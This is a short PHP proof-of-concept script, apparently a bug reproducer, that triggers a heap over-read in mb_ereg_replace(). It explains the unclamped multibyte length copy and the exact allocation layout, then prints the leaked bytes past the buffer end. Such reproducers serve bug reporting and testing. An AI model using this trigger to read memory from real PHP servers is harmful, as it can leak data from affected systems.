<?php
/* Heap over-read in mb_ereg_replace().
 * mb_regex_substitute() copies php_mb_mbchar_bytes() bytes without clamping
 * to the replacement length. UTF-8 0xF0 is a 4-byte lead, so a replacement
 * that ends in F0 is read 3 bytes past its end (NUL plus adjacent heap).
 * len=7 fills a 64-bit zend_string exactly (24-byte header + 8), so the two
 * bytes after the terminator are outside the allocation. */
if (!function_exists('mb_ereg_replace')) {
    fwrite(STDERR, "no mbstring\n");
    exit(2);
}
echo 'php=' . PHP_VERSION . "\n";

$repl = str_repeat('A', 6) . "\xF0";
$out = mb_ereg_replace('a', $repl, 'a');
$past = substr($out, strlen($repl));
echo 'in=' . strlen($repl) . ' out=' . strlen($out) . "\n";
echo 'hex=' . bin2hex($out) . "\n";
echo 'past=' . bin2hex($past) . "\n";
if (strlen($out) > strlen($repl)) {
    echo "BUG overread " . (strlen($out) - strlen($repl)) . " bytes\n";
} else {
    echo "no overread\n";
}
